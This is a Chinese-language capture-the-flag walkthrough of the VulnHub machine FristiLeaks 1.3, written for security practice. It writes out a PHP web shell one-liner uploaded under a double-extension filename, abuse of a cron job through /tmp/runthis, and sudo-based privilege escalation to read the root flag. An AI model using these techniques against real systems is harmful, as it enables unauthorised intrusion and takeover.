# FristiLeaks: 1.3

https://www.vulnhub.com/entry/fristileaks-13,133/

difficulty: Basic

Finish Date：2024-4-18

## IP

192.168.10.167

## Scan

Open Port -> 80

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
|_http-server-header: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
| http-robots.txt: 3 disallowed entries
|_/cola /sisi /beer
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
```

只开放了一个 80 端口，访问主页后没什么重要信息，使用目录扫描看看有没有隐藏目录。

robots.txt 中发现 3 个隐藏目录：

```
User-agent: *
Disallow: /cola
Disallow: /sisi
Disallow: /beer
```

这三个目录都是显示的同一张图片 /images/3037440.jpg ，对此图片查看是否有隐写信息，结果没找到。根据图片的文字提示，URL 不是这里，那应该还有隐藏的页面我们没有找到，继续寻找。看到 80 首页上的图片，提到了一个词：fristi，尝试访问这个目录，果然找到了网站隐藏的登录入口：http://192.168.10.167/fristi/

先进行下目录扫描，看看这个目录下，还有没与其他隐藏页面。发现了 http://192.168.10.167/fristi/uploads/ 但是我们没登陆，看不到页面内容。

看到登陆页面，联想到弱密码或者是 sql 注入。sqlmap 跑了一下，没有注入点。查看下页面的源代码是否能发现有用信息，找到如下信息：

```
<meta name="description" content="super leet password login-test page. We use base64 encoding for images so they are inline in the HTML. I read somewhere on the web, that thats a good way to do it.">
<!--
TODO:
We need to clean this up for production. I left some junk in here to make testing easier.

- by eezeepz
-->

<!--
iVBORw0KGgoAAAANSUhEUgAAAW0AAABLCAIAAAA04UHqAAAAAXNSR0IArs4c6QAAAARnQU1BAACx
jwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAARSSURBVHhe7dlRdtsgEIVhr8sL8nqymmwmi0kl
S0iAQGY0Nb01//dWSQyTgdxz2t5+AcCHHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixw
B4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL5kc+f
m63yaP7/XP/5RUM2jx7iMz1ZdqpguZHPl+zJO53b9+1gd/0TL2Wull5+RMpJq5tMTkE1paHlVXJJ
Zv7/d5i6qse0t9rWa6UMsR1+WrORl72DbdWKqZS0tMPqGl8LRhzyWjWkTFDPXFmulC7e81bxnNOvb
DpYzOMN1WqplLS0w+oaXwomXXtfhL8e6W+lrNdDFujoQNJ9XbKtHMpSUmn9BSeGf51bUcr6W+VjNd
jJQjcelwepPCjlLNXFpi8gktXfnVtYSd6UpINdPFCDlyKB3dyPLpSTVzZYnJR7R0WHEiFGv5NrDU
12qmC/1/Zz2ZWXi1abli0aLqjZdq5sqSxUgtWY7syq+u6UpINdOFeI5ENygbTfj+qDbc+QpG9c5
uvFQzV5aM15LlyMrfnrPU12qmC+Ucqd+g6E1JNsX16/i/6BtvvEQzF5YM2JLhyMLz4sNNtp/pSkg1
04VajmwziEdZvmSz9E0YbzbI/FSycgVSzZiXDNmS4cjCni+kLRnqizXThUqOhEkso2k5pGy00aLq
i1n+skSqGfOSIVsKC5Zv4+XH36vQzbl0V0t9rWb6EMyRaLLp+Bbhy31k8SBbjqpUNSHVjHXJmC2Fg
tOH0drysrz404sdLPW1mulDLUdSpdEsk5vf5Gtqg1xnfX88tu/PZy7VjHXJmC21H9lWvBBfdZb6Ws
30oZ0jk3y+pQ9fnEG4lNOco9UnY5dqxrhk0JZKezwdNwqfnv6AOUN9sWb6UMyR5zT2B+lwDh++Fl
3K/U+z2uFJNWNcMmhLzUe2v6n/dAWG+mLN9KGWI9EcKsMJl6o6+ecH8dv0Uu4PnkqDl2rGuiS8HK
ul9iMrFG9gqa/VTB8qORLuSTqF7fYU7tgsn/4+zfhV6aiiIsczlGrGvGTIlsLLhiPbnh6KnLDU12q
mD+0cKQ8nunpVcZ21Rj7erEz0WqoZ+5IRW1oXNB3Z/vBMWulSfYlm+hDLkcIAtuHEUzu/l9l867X34
rPtA6lmLi0ZrqX6gu37aIukRkVaylRfqpk+9HNkH85hNocTKC4P31Vebhd8fy/VzOTCkqeBWlrrFhe
EPdMjO3SSys7XVF+qmT5UcmT9+Ss//fyyOLU3kWoGLd59ZKb6Us10IZMjAP5b5AgAL3IEgBc5AsCLH
AHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzk
CwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL3IEgBc5AsCLHAHgRY4A8Pn9/QNa7zik1qtycQAAAABJR
U5ErkJggg==
-->
```

根据第一个提示，找到了一个潜在的用户名：eezeepz，有用的信息可能存在下面这个 base64 编码中，让我们解码看看有什么，发现是一张 png 图片，内容为：keKkeKKeKKeKkEkkEk，看上去像目录又像密码。使用用户凭证 eezeepz:keKkeKKeKKeKkEkkEk 尝试登陆系统，果然能登陆进去。然后看到是 upload file 功能，应该是让我们上传 php 后门，进而获得 web shell。

在我们先尝试上传了一个 php 文件后，得到了错误的提示：

```
Sorry, is not a valid file. Only allowed are: png,jpg,gif
Sorry, file not uploaded
```

先上传一个 gif 图片，找到了存放的目录 /uploads ，访问链接为 http://192.168.10.167/fristi/uploads/rev8888.gif。

继续尝试绕过，使用 bp 抓包，进行更改相关内容，看是否能绕过：

```
<?php system($_GET['cmd']);?>

filename="shell.php.gif"
```

结果访问：http://192.168.10.167/fristi/uploads/shell.php.gif?cmd=id 能够执行命令，目标系统存在解析漏洞。进而创建反弹命令，kali 上建立 nc 监听，获得到 webshell。

在/var/www 目录下，发现了一个 notes.txt，内容为：

```
hey eezeepz your homedir is a mess, go clean it up, just dont delete
the important stuff.

-jerry
```

提示我们 eezeepz 的家目录中有重要信息，切换到 /home/eezeepz 看看有什么，同样有一个 notes.txt :

```
Yo EZ,

I made it possible for you to do some automated checks,
but I did only allow you access to /usr/bin/* system binaries. I did
however copy a few extra often needed commands to my
homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those
from /home/admin/

Don't forget to specify the full path for each binary!

Just put a file called "runthis" in /tmp/, each line one command. The
output goes to the file "cronresult" in /tmp/. It should
run every minute with my account privileges.

- Jerry
```

提示到我们将要执行的命令写入到 /tmp/runthis 中，然后等待一分钟，就可以在 /tmp/cronresult 中看到结果。

在 /home 目录中能看到 admin 目录，但是没有权限，让我们先修改权限，进入 admin 目录看看有什么东西：

```
echo '/home/admin/chmod 777 /home/admin' > /tmp/runthis
```

1 分钟后计划任务执行，进入到 /home/admin 目录中，看到有一个提示文件 whoisyourgodnow.txt ：

```
localhost.localdomain:/home/admin $ cat whoisyourgodnow.txt
=RFn0AKnlMHMPIzpyuTI0ITG   <--
```

同时看到了一个加密文件 cryptpass.py ：

```
import base64,codecs,sys

def encodeString(str):
    base64string= base64.b64encode(str)
    return codecs.encode(base64string[::-1], 'rot13')

cryptoResult=encodeString(sys.argv[1])
print cryptoResult
```

还有一个被加密的 pass cryptedpass.txt：

```
mVGZ3O3omkJLmy2pcuTq
```

看样子需要我们将上面的加密 pass，通过对算法分析进行逆操作获取明文密码，正向操作是：base64 -> 倒序 -> rot13 ，那么反向的解码就为：rot13 -> 倒序 -> base64。在 CyberChef 中可以轻松的实现逆向解密过程，最终得到了解出的原始信息：

```
mVGZ3O3omkJLmy2pcuTq  -->  thisisalsopw123
=RFn0AKnlMHMPIzpyuTI0ITG  --> LetThereBeFristi!
```

指示我们的 god 应该是用户 fristigod，使用得到的两个密码，尝试切换用户到 su fristigod，正确的密码为：LetThereBeFristi!

sudo -l 看到有用信息：

```
(fristi : ALL) /var/fristigod/.secret_admin_stuff/doCom
```

发现这个文件也是一个 suid 文件，可以执行命令，以 root 权限去调用。

## flag

根据上面提示需要我们用 fristi 用户去执行这个命令，执行命令如下：

```
bash-4.1$ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom "ls /root"
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom "ls /root"
fristileaks_secrets.txt

bash-4.1$ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom "cat /root/fristileaks_secrets.txt"
stileaks_secrets.txt"ristigod/.secret_admin_stuff/doCom "cat /root/fri
Congratulations on beating FristiLeaks 1.0 by Ar0xA [https://tldr.nu]

I wonder if you beat it in the maximum 4 hours it's supposed to take!

Shoutout to people of #fristileaks (twitter) and #vulnhub (FreeNode)


Flag: Y0u_kn0w_y0u_l0ve_fr1st1
```

可以用内核漏洞 dirtycow 40839.c 同样也可以进行提权到 root。

## 补充

找到为什么上传的文件中含有.php 就能被解析？

/etc/httpd/conf.d/php.conf

```
AddHandler php5-script .php
AddType text/html .php
```

只要文件后缀中有.php 就能被当作 php 去解析。
